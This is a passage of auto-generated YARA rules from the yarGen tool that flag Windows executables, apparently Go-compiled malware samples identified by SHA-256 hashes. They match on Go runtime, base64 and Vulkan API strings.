      hash2 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      hash3 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "runtime._cgo_panic_internal" fullword ascii /* score: '7.00'*/
      $s2 = "_cgo_dummy_export" fullword ascii /* score: '7.00'*/
      $s3 = "_cgo_topofstack" fullword ascii /* score: '4.00'*/
      $s4 = "_cgo_panic" fullword ascii /* score: '1.00'*/
      $s5 = "crosscall2" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and ( all of them )
      ) or ( all of them )
}

rule _0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b_44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fc_65 {
   meta:
      description = "mw - from files 0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b, 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b"
      hash2 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash3 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
   strings:
      $s1 = "mstartbad sequence numberbad value for fielddevice not a streamdirectory not emptydisk quota exceededdodeltimer: wrong Pfile alr" ascii /* score: '4.00'*/
      $s2 = "sysmonWake" fullword ascii /* score: '4.00'*/
      $s3 = "ges/byte" fullword ascii /* score: '1.00'*/
      $s4 = "parked" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s5 = "me: invalid location nametimer when must be positivetoo many callback functionswork.nwait was > work.nproc args stack map entrie" ascii /* score: '0.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 15000KB and ( all of them )
      ) or ( all of them )
}

rule _0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b_44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fc_66 {
   meta:
      description = "mw - from files 0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b, 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b"
      hash2 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash3 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash4 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash5 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "*[8]time.abbr" fullword ascii /* score: '4.00'*/
      $s2 = "*time.abbr" fullword ascii /* score: '4.00'*/
      $s3 = "*map[string]time.abbr" fullword ascii /* score: '4.00'*/
      $s4 = "*[]time.abbr" fullword ascii /* score: '4.00'*/
      $s5 = "*map.bucket[string]time.abbr" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( all of them )
      ) or ( all of them )
}

rule _0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b_41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4_67 {
   meta:
      description = "mw - from files 0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b, 41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c, 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b"
      hash2 = "41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
      hash3 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash4 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
   strings:
      $s1 = "e nmspinninginvalid runtime symbol tablemheap.freeSpanLocked - span missing stack in shrinkstackmspan.sweep: m is not lockednewp" ascii /* score: '20.00'*/
      $s2 = "runtime: bad pointer in frame runtime: found in object at *(runtime: impossible type kind socket operation on non-socketsync: in" ascii /* score: '15.00'*/
      $s3 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '10.00'*/
      $s4 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '10.00'*/
      $s5 = "compileCallback: float arguments not supportedmemory reservation exceeds address space limitpanicwrap: unexpected string after t" ascii /* score: '6.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 15000KB and ( all of them )
      ) or ( all of them )
}

rule _41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c_44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fc_68 {
   meta:
      description = "mw - from files 41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c, 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
      hash2 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash3 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash4 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash5 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
   strings:
      $s1 = "encoding/base64.(*CorruptInputError).Error" fullword ascii /* score: '7.00'*/
      $s2 = "encoding/base64.CorruptInputError.Error" fullword ascii /* score: '7.00'*/
      $s3 = "encoding/base64.(*Encoding).Decode" fullword ascii /* score: '6.00'*/
      $s4 = "encoding/base64.(*Encoding).decodeQuantum" fullword ascii /* score: '6.00'*/
      $s5 = "encoding/base64.(*Encoding).DecodeString" fullword ascii /* score: '6.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( all of them )
      ) or ( all of them )
}

rule _90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad_eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d_69 {
   meta:
      description = "mw - from files 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      hash2 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "vulkan-1.dll" fullword ascii /* score: '20.00'*/
      $s2 = "vkGetPhysicalDeviceWin32PresentationSupportKHR" fullword ascii /* score: '8.00'*/
      $s3 = "vkGetInstanceProcAddr" fullword ascii /* score: '5.00'*/
      $s4 = "vkCreateWin32SurfaceKHR" fullword ascii /* score: '4.00'*/
      $s5 = "vkEnumerateInstanceExtensionProperties" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and ( all of them )
      ) or ( all of them )
}

